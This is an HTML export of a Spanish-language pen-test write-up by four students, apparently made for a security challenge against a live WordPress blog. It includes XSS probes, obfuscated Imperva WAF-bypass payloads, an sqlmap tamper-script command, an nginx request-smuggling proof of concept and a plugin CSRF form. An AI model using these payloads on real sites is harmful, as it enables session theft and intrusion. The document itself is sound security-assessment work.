body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-break-before:always}
.listingblock code[data-lang]::before{display:block}
#footer{padding:0 .9375em}
.hide-on-print{display:none!important}
.print-only{display:block!important}
.hide-for-print{display:none!important}
.show-for-print{display:inherit!important}}
@media print,amzn-kf8{#header>h1:first-child{margin-top:1.25rem}
.sect1{padding:0!important}
.sect1+.sect1{border:0}
#footer{background:none}
#footer-text{color:rgba(0,0,0,.6);font-size:.9em}}
@media amzn-kf8{#header,#content,#footnotes,#footer{padding:0}}
</style>
</head>
<body class="article">
<div id="header">
<h1>Trust Dimension Challenge| Cache Utility Mainframe</h1>
<div class="details">
<span id="author" class="author">Manuel Alejandro Hernández López &lt;itsalexhelo@gmail.com&gt;</span><br>
<span id="author2" class="author">Aldo Ponce de la Cruz &lt;aldoponcedelacruz@gmail.com&gt;</span><br>
<span id="author3" class="author">Samuel Kareem Cueto González &lt;samuelcueto.2000@gmail.com&gt;</span><br>
<span id="author4" class="author">José Antonio Berrón Guitérrez &lt;A01377269@itesm.mx&gt;</span><br>
</div>
</div>
<div id="content">
<div id="preamble">
<div class="sectionbody">
<div class="paragraph">
<p>El desafío de la empresa <strong>Trust Dimension</strong> consistió en realizar un <em>pen test</em> a la pagina web <code>www.comoinstalarlinux.com</code> y documentar todas las vulnerabilidades que encontraramos. A continuación no solo mostraremos las fallas de seguridad encontradas sino que tambien nuestro proceso para tratar de atacar la pagina desde cada vector posible y nuestros hallazgos.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_visitar_y_explorar_el_sitio_web">Visitar y explorar el sitio web</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Cuando aprendimos acerca del desafío lo primero que hicimos fue inspeccionar la página con la que estaríamos trabajando por las siguientes 24 horas. <code>www.comoinstalarlinux.com</code> puede que parezca un simple blog dedicado a multiples distros de Linux, sin embargo debajo de la superficie cuenta con multiples fallas de seguridad y un sistema que trata de remediar esto.</p>
</div>
<div class="paragraph">
<p>Para tratar de obtener posible información básica de la página corrimos un analisis WhoIs, no nos dio mucha información de los dueños o del hosting debido a que tenia servicios de protección de datos contratadas, sin embargo encontramos que estaba corriendo una versión vieja de <em>Nginx (1.14.0)</em> lo cual utilizamos despues para encontrar encontrar posibles exploits en la página.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_scan_rápido_en_busca_de_vulnerabilidades">Scan rápido en busca de vulnerabilidades</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Después de esto hicimos un scan en <em>PenTest-Tools</em> para encontrar rápidamente malas prácticas y pequeños hoyos de seguridad en el sistema. Los resultados no solo nos afirmaron que el software del serveridor web  esta desactualizado <em>(Nginx)</em>, sino que también nos indico sobre multiples Cookies que no contaban con flags esenciales.</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 1. Cookies Inseguras</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Cookie</th>
<th class="tableblock halign-left valign-top">Flag faltante</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">\__utmvmcXuOfzYZ</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Secure, HttpOnly</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">incap_ses_802_2384837</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Secure, HttpOnly</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">\__utmvacXuOfzYZ</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Secure, HttpOnly</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">visid_incap_2384837</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Secure</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">\__utmvbcXuOfzYZ</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Secure, HttpOnly</p></td>
</tr>
</tbody>
</table>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<div class="title">Note</div>
</td>
<td class="content">
La falta de la flag <code>secure</code> nos dice que estas cookies pueden ser interceptadas y leídas en plaintext, esto puede hacer que la sesión de un usuario sea robada. Además, la falta de la flag <code>HttpOnly</code> permite que un atacante pueda robar una de estas cookies con un client-side script como lo es JavaScript.
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Este scan también nos mostró que la página no contaba con el header de seguridad <code>X-XSS-Protection</code> que se encarga de mitigar ataques de <em>Cross Side Scripting (XSS)</em> el cual consiste en inyectar código de JavaScript en la página.</p>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<div class="title">Warning</div>
</td>
<td class="content">
La falta de este header más la falta de la flag <code>HttpOnly</code> puede facilitar el robo de cookies a traves de XSS.
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Por último, descubrimos que la página aun cuenta con el archivo público <code>Robots.txt</code> y aunque esto no sea siempre malo en este caso logramos acceder a una página de gran importancia:</p>
</div>
<div class="paragraph">
<p><code><a href="https://www.comoinstalarlinux.com/wp-admin" class="bare">https://www.comoinstalarlinux.com/wp-admin</a></code></p>
</div>
<div class="paragraph">
<p>En otras palabras, ya contabamos con la página donde se inicia sesión de adiministrador.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_xss_sqlinjection_básico">XSS &amp; SQLinjection básico</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Con esta información procedimos a intentar correr código de JavaScript en el sitio a traves de XSS, intentamos un comando básico simplemente para ver si era posible</p>
</div>
<div class="paragraph">
<p><code>&lt;script&gt;Alert('XSS');&lt;/script&gt;</code></p>
</div>
<div class="paragraph">
<p>Sin embargo, cualquier intento resultaba en el siguiente error:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="https://i.imgur.com/MFbcNq3.png" alt="Error Code 15">
</div>
</div>
<div class="paragraph">
<p>A pesar de que el sitio era vulnerable, este logró bloquear nuestro intento de XSS, sin embargo sabíamos que el sitio no sanitizaba input fields sino que bloqueaba intentos de XSS. Esto nos hizo intentar otro ataque diferente. Intentamos realizar una SQLinjection para ver si era posible, pero al intentar multiples parametros como <code>DROP</code> o <code>SLEEP</code> todo nos daba el mismo error hasta que eventualmente conseguimos un <strong>Error Code 14</strong> que a diferencia del error anterior, bloqueaba nuestra IP al acceder a la página. La única manera de salir de este error era reiniciar nuestro browser, fue ahí cuando nos dimos cuenta que nuestro mayor problema iba a ser el software que evitaba correr payloads en la página.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_imperva_waf">Imperva - WAF:</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Aquí es donde descubrimos acerca de Imperva, un <em>Web Application Firewall</em> el cual se encarga de proteger la página a pesar de todos los hoyos de seguridad que tenga. Imperva no solo bloqueaba todos nuestros intentos de correr código externo en la página sino que tambien proporcionaba <em>Login Protect</em> en el URL <code><a href="https://www.comoinstalarlinux.com/wp-admin" class="bare">https://www.comoinstalarlinux.com/wp-admin</a></code> una medida de seguridad extra en la página de administrador. Poco a poco este Firewall demostó lo robusto que puede llegar a ser para defender todo tipo de ataques.</p>
</div>
<div class="paragraph">
<p>Al final de nuestros intentos descubrimos varias cosas de los ajustes de Imperva en esta página y eventualmente empezamos a construir un payload para tratar de engañarla.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_análisis_con_nikto_nmap">Análisis con Nikto &amp; Nmap</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Debido a que Imperva frustró muchos de nuestros intentos de hackeo decidimos seguir escaneando posibles vulnerabilidades y vectores de ataque, intentamos escanear con <em>Nikto</em>, un programa que se dedica a mostrar informacion y posibles vulnerabilidades basicas de la página, sin embargo no nos dijo nada nuevo. Ahi es cuando tratamos de usar Nmap y descubrimos más de 200 puertos abiertos en la direccion IP, sin embargo la mayoría pertenecia a un servicio llamado <em>Incapsula</em>, despues de una pequeña busqueda nos dimos cuenta que Incapsula <strong>pertenece a Imperva</strong> y por lo tanto nos rendimos en tratar de conseguir un vector de ataque de esta manera.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_búsqueda_de_vulnerabilidades_por_medio_de_nginx">Búsqueda de vulnerabilidades por medio de Nginx:</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Eventualmente recordamos que nunca intenamos explotar las vulnerabilidades del Web Server Software, al buscar la version en una base de datos de vulnerabilidades encontramos 4 diferentes vulnerabilidades resgistradas.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>CVE-2018-16843

CVE-2018-16844

CVE-2018-16845</pre>
</div>
</div>
<div class="paragraph">
<p>Estas tres nos permiten modificar módulos para incrementar el consumo de memoria y CPU del servidor, sin embargo estos módulos no están activados por default.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>CVE-2018-16845</pre>
</div>
</div>
<div class="paragraph">
<p>Esta vulnerabilidad es más interesante ya que permite HTTP request smuggling bajo casos muy específicos, esto se hace al realizar un request al error_handler (404) y al mismo tiempo a un segundo servidor que corre variables que no deberían ser públicas para el público. A continuación colocamos un caso de uso:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>The request that is made to the server looks as follows:
GET /a HTTP/1.1
Host: localhost
Content-Length: 56
GET /_hidden/index.html HTTP/1.1
Host: notlocalhost


This can be easily crafted using printf on the command line with ncat creating our connection to the remote
server:
printf "GET /a HTTP/1.1\r\nHost: localhost\r\nContent-Length: 56\r\n\r\nGET
/_hidden/index.html HTTP/1.1\r\nHost: notlocalhost\r\n\r\n" | ncat localhost 80 --noshutdown

You’ll see the following as output of that request, notice the second pipe-lined request for the “hidden” text
that is on notlocalhost:

HTTP/1.1 302 Moved Temporarily
Server: nginx/1.17.6
Date: Fri, 06 Dec 2019 18:23:33 GMT
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: http://example.org

&lt;html&gt;
&lt;head&gt;&lt;title&gt;302 Found&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;302 Found&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.17.6&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Fri, 06 Dec 2019 18:23:33 GMT
Content-Type: text/html
Content-Length: 22
Connection: keep-alive
This should be hidden!</pre>
</div>
</div>
<div class="paragraph">
<p>Al tratar de aplicar este exploit no nos fue posible debido a el setup del server sin embargo es necesario actualizar la versión de nginx para poder evitar estas 4 vulnerabilidades.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_más_xss">Más XSS</h2>
<div class="sectionbody">
<div class="paragraph">
<p>No nos dimos por vencidos en el XSS y tratamos maneras más complejas de realizar estas inyecciones de código creando imágenes, vectores y modificando user input. Además, en lugar de solo intentarlo en las barras de búsqueda, intentamos utilizar la sección de comentarios, donde logramos realizar HTML Injection, sin embargo no logramos hacer que funcionara fuera de eso ya que el parámetro <code>code</code> solo el pasba formato al texto.</p>
</div>
<div class="paragraph">
<p>Un ejemplo de una Payload exitosa en un comentario se ve de la manera siguiente</p>
</div>
<div class="paragraph">
<p><code>&lt;code onmouseover="new hello;"&gt;test&lt;/code&gt;</code></p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sqlmap_tamper_scripts_y_como_imperva_bloquea_ataques_automatizados">SQLMap, tamper scripts y como Imperva bloquea ataques automatizados</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Siguiendo este tren del pensamiento igualmente tratamos de realizar SQL injections más complejas, esto lo hicimos con la herramienta <em>SQLMap</em> ya que permite realizar cientos de queries de este tipo rápidamente. Sin embargo regresaba a múltiples errores 4XX, esto significa que Imperva estaba detectando y bloqueando nuestra serie de ataques automatizados, convenientemente SQLMap cuenta con <em>Tamper Scrpits</em>, scripts realizados para burlas WAFs básicas y muy poderosos cuando utilizados juntos. Tristemente a pesar de utilizar múltiples scripts en múltiples combinaciones no logramos conseguir nada exitoso.</p>
</div>
<div class="paragraph">
<p>Un ejemplo de un comando en SQLMap:</p>
</div>
<div class="paragraph">
<p><code>sqlmap -u 'http://www.comoinstalarlinux/?s=’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords</code></p>
</div>
<div class="paragraph">
<p>Creemos que la razón por la que no logramos que funcionara fue porque los tamper scripts están hechos para engañar WAFs mucho más pequeños que Imperva.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_hidden_input_fields">Hidden Input Fields?</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Fue aquí donde llegamos a un punto en el cual no sabíamos qué más hacer, fue ahí cuando nos dimos cuenta que al buscar desde la página de inicio el URL contaba con dos parámetros extra:</p>
</div>
<div class="paragraph">
<p><code><a href="https://www.comoinstalarlinux.com/?s=&amp;cmd=\_s-xclick&amp;hosted_button_id=M9HVCB2Y7M9D8" class="bare">https://www.comoinstalarlinux.com/?s=&amp;cmd=\_s-xclick&amp;hosted_button_id=M9HVCB2Y7M9D8</a></code></p>
</div>
<div class="paragraph">
<p>No lográbamos identificar de donde salían los values <code>s-xclick</code> y <code>M9HVCB2Y7M9D8</code>, pero rapidamente encontramos que eran hidden input fields en la página de inicio. Intentamos lograr un XSS pero la única manera consistente conocida es con el parámetro <code>acceskey</code> el cual solo se activa cuando el usuario presiona una combinación de teclas específicas. A pesar de esto creemos que estos dos hidden inputs podrías ser vectores de ataque para XSS.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_waf_xss_bypass">WAF XSS Bypass</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Fijados por encontrar XSS en el sitio (principalmente debido a la falta de headers y al gran potencial que tiene esta táctica) investigamos acerca de métodos de bypass para el WAF. Descubrimos que Imperva y la mayoría de los WAFs utilizan regex para determinar lo que es un posible intento de XSS y gracias a esto descubrimos muchas técnicas para poder intentar crear una Payload que lograra evitar ser detectada por Imperva.</p>
</div>
<div class="paragraph">
<p>Algunos de nuestros hallazgos fueron:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Evitar utilizar queries comunes como <code>onerror</code></p>
</li>
<li>
<p>Intentar maneras creativas de segmentar las payloads como podría dividir en múltiples variables</p>
</li>
<li>
<p>Tratar de esconder el código para que no parezca JavaScript</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Un ejemplo de un bypass de Imperva fue visto en Febrero de este año, este utilizó JJencode para transformar JavaScript en html que ejecutara un alert.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>alert("Hello, JavaScript" )</pre>
</div>
</div>
<div class="paragraph">
<p>El mismo código después de JJENCODE</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"(\\\"\\"+$.__$+$.__$+$.___+$.$$$_+(![]+"")[$._$_]+(![]+"")[$._$_]+$._$+",\\"+$.$__+$.___+"\\"+$.__$+$.__$+$._$_+$.$_$_+"\\"+$.__$+$.$$_+$.$$_+$.$_$_+"\\"+$.__$+$._$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"\\\"\\"+$.$__+$.___+")"+"\"")())();</pre>
</div>
</div>
<div class="paragraph">
<p>Finalmente tras esconderlo en un URL y meterlo dentro de un método OnMouseOver</p>
</div>
<div class="literalblock">
<div class="content">
<pre>https://comoinstalarlinux/?s=%3E%3C/span%3E%3Cp%20onmouseover=%27p%3D%7E%5B%5D%3Bp%3D%7B%5F%5F%5F%3A%2B%2Bp%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%5F%24%3A%2B%2Bp%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%24%5F%3A%2B%2Bp%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%24%3A%28p%5Bp%5D%2B%22%22%29%5Bp%5D%2C%5F%24%24%3A%2B%2Bp%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5Bp%5D%2C%24%5F%5F%3A%2B%2Bp%2C%24%5F%24%3A%2B%2Bp%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%3A%2B%2Bp%2C%24%24%24%3A%2B%2Bp%2C%24%5F%5F%5F%3A%2B%2Bp%2C%24%5F%5F%24%3A%2B%2Bp%7D%3Bp%2E%24%5F%3D%28p%2E%24%5F%3Dp%2B%22%22%29%5Bp%2E%24%5F%24%5D%2B%28p%2E%5F%24%3Dp%2E%24%5F%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%24%24%3D%28p%2E%24%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28%28%21p%29%2B%22%22%29%5Bp%2E%5F%24%24%5D%2B%28p%2E%5F%5F%3Dp%2E%24%5F%5Bp%2E%24%24%5F%5D%29%2B%28p%2E%24%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%5F%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%5F%5D%29%2Bp%2E%24%5F%5Bp%2E%24%5F%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%24%2Bp%2E%24%3Bp%2E%24%24%3Dp%2E%24%2B%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%2Bp%2E%24%2Bp%2E%24%24%3Bp%2E%24%3D%28p%2E%5F%5F%5F%29%5Bp%2E%24%5F%5D%5Bp%2E%24%5F%5D%3Bp%2E%24%28p%2E%24%28p%2E%24%24%2B%22%5C%22%22%2Bp%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%24%24%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2Bp%2E%5F%5F%2B%22%28%5C%5C%5C%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%5F%2Bp%2E%24%24%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%5F%24%2B%22%2C%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%24%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%5F%24%24%2Bp%2E%24%24%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%5F%24%2Bp%2E%5F%5F%24%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%5F%5F%2Bp%2E%5F%5F%2B%22%5C%5C%5C%22%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3B%27%3E</pre>
</div>
</div>
<div class="paragraph">
<p>Sin embargo podemos saber que están utilizando una versión reciente de Imperva ya que este XSS Bypass ya no funciona, sin embargo nos enseña métodos para poder realizar uno nosotros mismos</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_wpscan">WPScan</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Nos dimos cuenta de que aun no habíamos utilizado una de las herramientas más poderosas para páginas de WordPress, <em>WPScan</em> el cual nos ayuda dándonos toda la información de WordPress posible del sitio.</p>
</div>
<div class="paragraph">
<p>Un gran detalle que nos dio WPScan fueron 2 usuarios administradores en el sitio. Descubrimos que utilizan WordPress 5.5 (la versión más nueva sin ninguna vulnerabilidad) y múltiples plugins de los cuales 2 nos llamaron la atención. Además de ver el versionado de estos también descubrimos que el XML-RPC era público y eso podría ser una gran oportunidad para vulnerar el sitio.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_xml_rpc">XML-RPC</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Gracias a WPScan encontramos que el url <code><a href="http://www.comoinstalarlinux.com/wp/xmlrpc.php" class="bare">http://www.comoinstalarlinux.com/wp/xmlrpc.php</a></code> era público, entonces teníamos acceso al <em>XML-RPC</em>, este es un API de wordpress que puede ser utilizado para ver y usar los servicios a través de POST requests, teníamos mucho optimismo ya que no parecía que hubiera nada interfiriendo entre nosotros y esta página, sin embargo al hacer el siguiente POST Request en Postman tuvimos un gran problema</p>
</div>
<div class="literalblock">
<div class="content">
<pre>&lt;methodCall&gt;
&lt;methodName&gt;system.listMethods&lt;/methodName&gt;
&lt;params&gt;&lt;/params&gt;
&lt;/methodCall&gt;</pre>
</div>
</div>
<div class="paragraph">
<p>Esta función usualmente regresa una lista con todos los métodos disponibles para el sitio web sin embargo para nosotros regresó algo que indicaba que este servicio no estaba bien armado en el back-end.</p>
</div>
<div class="paragraph">
<p><code>&lt;Fault -32700: 'parse error. not well formed'&gt;</code></p>
</div>
<div class="paragraph">
<p>Esto significa que en el back-end no está bien instalado el servicio <code>php-xml</code> y no había nada que pudiéramos hacer para habilitarlo.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_plugins_vulnerabilities">Plugins &amp; Vulnerabilities</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Sin embargo, WPScan nos regresó vulnerabilidades importantes para dos extensiones de la página</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Quick Page Post Redirect - 3 Vulnerabilidades</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Para este plugin encontramos 3 vulnerabilidades, sin embargo no pudimos implementarlas debido a que para 2 de ellas era necesario que un administrador del sitio accediera a una página web con un bloque de código similar a la siguiente prueba de concepto:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>&lt;form method=\"POST\" action=\"http://localhost/wp-admin/admin.php?page=redirect-updates\&gt;
  &lt;input type=\"text\" name=\"quickppr_redirects[request][]\" value=\""&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;
  &lt;input type=\"text\" name=\"quickppr_redirects[destination][]\" value=\"http://dxw.com/\"&gt;
  &lt;Input type=\"text\" name=\"submit_301\" value=\"1\"&gt;
  &lt;input type=\"submit\"&gt;
&lt;/form&gt;


Vulnerabilidades en la base de datos de WPScan:
https://wpvulndb.com/vulnerabilities/7209
https://wpvulndb.com/vulnerabilities/7210</pre>
</div>
</div>
<div class="paragraph">
<p>La tercera vulnerabilidad era de tipo escalada de privilegios ya que dejaba que contribuidores del sitio pudieran hacer redirects a cualquier otra página utilizando el header <code>location</code></p>
</div>
<div class="paragraph">
<p><code><a href="https://wpvulndb.com/vulnerabilities/10198" class="bare">https://wpvulndb.com/vulnerabilities/10198</a></code></p>
</div>
<div class="ulist">
<ul>
<li>
<p>W3-total-cache - 17 vulnerabilidades</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Este plugin es uno de los más utilizados en Wordpress y sin embargo cuenta con múltiples vulnerabilidades críticas, la mayoría de estas ya han sido parchadas, pero, debido a que WPScan no logró identificar la versión utilizada por el sitio fue necesario revisar la más nueva y la más popular. Esta es conocida como <em>W3-Total-Fail</em> y con este exploit es posible conseguir los hashes del usuario administrador y su contraseña.</p>
</div>
<div class="paragraph">
<p>El usuario <em>FireFart</em>, co-creador de WPScan creó un script en ruby que se aprovecha de este exploit, tristemente después de correrlo podemos ver que no funciona y por lo tanto la versión utilizada por la página web debe ser más nueva.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_aún_más_xss_y_como_engañar_un_waf">Aún más XSS (y como engañar un WAF)</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Aquí fue cuando logramos posiblemente la Payload más exitosa hasta ahora, somos capaces de mandarla a través de la search bar sin problemas sin embargo cuando tratamos de implementarla en un comentario el sitio banea nuestra IP automáticamente en lugar de darnos el famoso <strong>Error Code 15</strong>, es posible que esta Payload pueda ser utilizada para Bypassear Imperva debido a la manera en la que está construida:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>\”));}catch(e){document.write(String.fromCharCode(60,104,116,109,108,62,60,98,111,100,121,62,60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,88,83,83,34,41,60,47,115,99,114,105,112,116,62,60,47,98,111,100,121,62,60,47,104,116,109,108,62));}//

Para entender cómo funciona esta Payload es necesario dividirla:


\”));}catch(e){document.write
Utilizamos document.write en lugar de alert debido a que alert es una keyword reconocida no solo por Imperva sino por muchos WAFs

(String.fromCharCode
Esconderemos nuestra Payload en chars es por eso que es necesario tener este método para convertirla en String una vez que la usemos.

&lt;html&gt;&lt;body&gt;&lt;script&gt;alert(“XSS”)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;
Puede que esta parte no se vea en la Payload original, pero esto es debido a que la transformamos a chars de la siguiente manera

60,104,116,109,108,62,60,98,111,100,121,62,60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,88,83,83,34,41,60,47,115,99,114,105,112,116,62,60,47,98,111,100,121,62,60,47,104,116,109,108,62

Y es así como tenemos una Payload potencial que no es detectada por Imperva.</pre>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_finalmente_json">Finalmente&#8230;&#8203; JSON</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Después de un par de horas descubrimos que era posible acceder a los JSONs de la página con el siguiente URL:</p>
</div>
<div class="paragraph">
<p><code><a href="https://www.comoinstalarlinux.com/wp-json" class="bare">https://www.comoinstalarlinux.com/wp-json</a></code></p>
</div>
<div class="paragraph">
<p>Este fue un gran hallazgo ya que podíamos intentar hacer POSTs y GETs a diferentes partes de la página y al mismo tiempo ver que parámetros eran necesarios. Incluso fuimos capaces de conseguir más información del admin de la página:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>[
  {
    "id": 1,
    "name": "Luis Armando Medina",
    "url": "http://www.luisarmandomedina.com",
    "description": "",
    "link": "https://www.comoinstalarlinux.com/author/luis-armando-medina/",
    "slug": "luis-armando-medina",
    "avatar_urls": {
      "24": "https://secure.gravatar.com/avatar/a8dcc69baf3e0f31ea16f1db4c4e79fa?s=24&amp;r=r",
      "48": "https://secure.gravatar.com/avatar/a8dcc69baf3e0f31ea16f1db4c4e79fa?s=48&amp;r=r",
      "96": "https://secure.gravatar.com/avatar/a8dcc69baf3e0f31ea16f1db4c4e79fa?s=96&amp;r=r"
    },
    "meta": [],
    "_links": {
      "self": [
        {
          "href": "https://www.comoinstalarlinux.com/wp-json/wp/v2/users/1"
        }
      ],
      "collection": [
        {
          "href": "https://www.comoinstalarlinux.com/wp-json/wp/v2/users"
        }
      ]
    }
  }
]</pre>
</div>
</div>
<div class="paragraph">
<p>Nos acercamos a editar el ultimo post al hacer un POST Request a <code><a href="https://www.comoinstalarlinux.com/wp-json/wp/v2/posts/5337" class="bare">https://www.comoinstalarlinux.com/wp-json/wp/v2/posts/5337</a></code> sin embargo esto nos regreso un "No tiene permitido editar esta publicación".</p>
</div>
<div class="paragraph">
<p>Tratamos de spoofear nuestro usuario pero al ingresar al URL <code><a href="https://www.comoinstalarlinux.com/wp-json/wp/v2/users/1" class="bare">https://www.comoinstalarlinux.com/wp-json/wp/v2/users/1</a></code> y fue ahí cuando dejó de funcionar nuestra conexión con el servidor. Cualquier intento después de eso nos daba un fatal <strong>Error Code 20 - The proxy failed to connect to the web server, due to TCP connection timeout.</strong>, no era posible acceder con ninguna de los dispositivos, esto nos hace pensar que puede haber sido un IP ban ya que se intentó  cambiar el DNS múltiples veces.</p>
</div>
<div class="paragraph">
<p>En conclusión estos son todos los hallazgos y posibles vulnerabilidades que encontramos, a pesar de que no fue posible conseguir acceso de administrador como se esperaba encontramos múltiples fallas que son salvadas por el WAF e incluso diseñamos una Payload que posiblemente puede sobrepasar este servicio. Fue una experiencia en la que aprendimos mucho y la disfrutamos plenamente.</p>
</div>
<div class="paragraph">
